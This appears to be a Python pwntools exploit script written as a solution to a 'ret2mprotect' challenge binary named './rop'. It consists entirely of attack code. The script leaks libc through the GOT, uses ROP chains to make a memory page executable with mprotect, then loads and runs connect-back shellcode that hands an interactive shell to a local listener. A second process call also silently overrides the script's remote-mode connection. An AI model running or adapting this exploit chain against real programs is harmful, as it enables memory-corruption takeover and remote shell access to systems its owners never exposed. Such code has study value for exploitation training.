#!/usr/bin/python2
#Author: Wh04m1
#Description: ret2mprotect solution 
#socat TCP-LISTEN:4444,fork EXEC:./rop

from pwn import *

context(os='linux', arch='amd64') #,terminal=['konsole', '--new-tab', '-e'])

if args["DEBUG"]: context.log_level = 'debug'
elf = ELF('./rop')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
address = 0x00600000 # vmmap 
shellcode = shellcraft.amd64.connect('127.0.0.1', 1337)
shellcode += shellcraft.amd64.linux.setreuid()
shellcode += shellcraft.amd64.linux.setregid()
shellcode += shellcraft.amd64.linux.dupsh()
if args['REMOTE']: io = remote('127.0.0.1', 4444)
else: io = process(elf.path)

rop.call(elf.sym['write'],[1,elf.got['write']])
rop.call(elf.sym['main'])

io = process(elf.path)
offset = 136
io.sendlineafter(':',fit({offset:rop.chain()}))
libc_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.sym['write'] 
libc.address = libc_addr
info('libc will be @ {}'.format(hex(libc_addr))) 

rop = ROP(libc)
rop.call(libc.sym['mprotect'],[address,1000,7])
rop.call(elf.sym['main'])
info(rop.dump())
io.sendlineafter(':',fit({offset:rop.chain()}))

rop = ROP(libc)
rop.read(0,address,len(shellcode))
rop.raw(address)
rop.call(elf.sym['main'])
info(rop.dump())
io.sendlineafter(':',fit({offset:rop.chain()}))

l = listen(1337)
io.sendline(asm(shellcode))
l.wait_for_connection()
l.interactive(pwnlib.term.init())
